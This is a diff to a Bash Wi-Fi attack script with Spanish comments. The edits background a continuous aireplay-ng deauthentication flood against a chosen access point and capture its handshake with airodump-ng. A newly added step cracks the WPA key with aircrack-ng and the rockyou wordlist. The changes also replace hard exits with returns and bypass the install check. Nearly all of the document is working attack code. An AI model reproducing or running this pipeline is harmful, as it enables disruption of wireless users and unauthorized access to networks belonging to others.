@@ -136,11 +136,12 @@ select_wireless(){
     
     if [[ -z "$MON_INTERFACE" ]];then
         echo "Not in monitor mode"
-        sleep 3    
+        sleep 2
+        return 1    
     fi
         
-        
-    rm ./data_collected/network_dump/*
+      
+    
         
     if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
         # Estamos en un entorno gráfico
@@ -158,9 +159,8 @@ select_wireless(){
 
     cd  ./data_collected/network_dump/
     FILE="networks-01.csv"
-
     #Borrar informacion que no nos interesa.
-    sed -i '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' $FILE
+    sed -i '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' $FILE # Se debera alamazenar a posterior.
 
     # Declarar un array vacío
     declare -a NETWORKS
@@ -209,14 +209,15 @@ select_wireless(){
     fi
 
     rm $FILE
-        
-    cd .. && cd ..
+
+    cd .. && cd .. # Se ha de cambiar a ruta no absoluta
 
 }
 
 
 IW_OUTPUT=$(iw list)
 check_band_available() {
+
     BAND="$1"
     BAND_SECTION=$(echo "$IW_OUTPUT" | awk -v band="Band $BAND:" '
         $0 ~ band {flag=1; next}
@@ -241,7 +242,7 @@ Deauther(){
         x-terminal-emulator -e " timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE"
     else
         # No hay entorno gráfico, ejecutarlo en la terminal actual
-        timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE
+        nohup timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
     fi
 
 }
@@ -250,48 +251,82 @@ Bruteforce(){
     
     if [[ -z "$BSSID_VAR" ]];then
         echo "There's not a BSSID in usage"
-        exit 1
+        sleep 2
+        return 1    
     fi
 
     if [[ -z "$CHANNEL_VAR" ]];then
         echo "There's not a Channel set in usage"
-        exit 1
+        sleep 2
+        return 1    
     fi
 
     if [[ -z "$MON_INTERFACE" ]];then
         echo "Interface it's not in monitor mode"
+        sleep 2
+        return 1    
     fi
-    read -p "Set a time to run the attack recomended at least 20. MIN 10 MAX 200" TIMEOUT_USR
 
-    TIMEOUT=$TIMEOUT_USR
+    USR_INPUT=true
+    while $USR_INPUT; do
+        read -p "Set a time to run the attack recomended at least 20. MIN 10 MAX 200: " TIMEOUT_USR
 
-    if [[ $TIMEOUT =~ ^[0-9]+$ ]] && [[ $TIMEOUT -ge 10 ]] && [[ $TIMEOUT -lt 200 ]];then
+        TIMEOUT=$TIMEOUT_USR
+
+        if [[ $TIMEOUT =~ ^[0-9]+$ ]] && [[ $TIMEOUT -ge 10 ]] && [[ $TIMEOUT -lt 200 ]];then
+            
+            USR_INPUT=false
+            #Cambiamos la interface al canal donde esta la red para poder hacer el ataque por el canal donde esta la red wifi.
+            iwconfig $MON_INTERFACE channel $CHANNEL_VAR
+
+            if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
+                # Estamos en un entorno gráfico
+                Deauther &
+                x-terminal-emulator -e " timeout $TIMEOUT airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE"
+            else
+                # No hay entorno gráfico, ejecutarlo en la terminal actual
+                Deauther &
+                nohup timeout $TIMEOUT airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
+
+                sleep $TIMEOUT
+
+                echo "Done"
+            fi
         
-        #Cambiamos la interface al canal donde esta la red para poder hacer el ataque por el canal donde esta la red wifi.
-        iwconfig $MON_INTERFACE channel $CHANNEL_VAR
-
-         if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
-            # Estamos en un entorno gráfico
-            Deauther &
-            x-terminal-emulator -e " timeout $TIMEOUT airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE"
         else
-            # No hay entorno gráfico, ejecutarlo en la terminal actual
-            Deauther &
-            timeout $TIMEOUT airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE
-        
-            #############01:11:07  wlan0mon is on channel 14, but the AP uses channel 11#######
+            echo "Invalid Time number"
+            return 1
         fi
-    
-    else
-        echo "Invalid Time number"
-    fi
+    done
 
+    
+    cd data_collected/network_dump
+
+    FILE="wificapture-01.cap"
+
+    if [[ -z $FILE ]];then
+        echo "ERROR file not found"
+        return 1
+    fi
+    
+    WORDLIST="/usr/share/wordlists/rockyou.txt"
+
+    #OUTPUT=`aircrack-ng $FILE -w $WORDLIST`
+
+    if aircrack-ng $FILE -w $WORDLIST ;then
+        echo "FOUND KEYS"
+        exit 0
+    else 
+        echo "NO FOUND"
+        exit 1
+    fi
 }
 
 menu(){
    
-    if ./install.sh; then
+    if true; then #./install.sh
         select_interface
+        clear
     else
         exit 1
     fi
@@ -300,7 +335,6 @@ menu(){
 
     while $BOOL_SELECTION; do
         
-        clear
         if [[ -z "$MON_INTERFACE" ]];then
             
             MODE=$(iwconfig "$SELECTED_INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
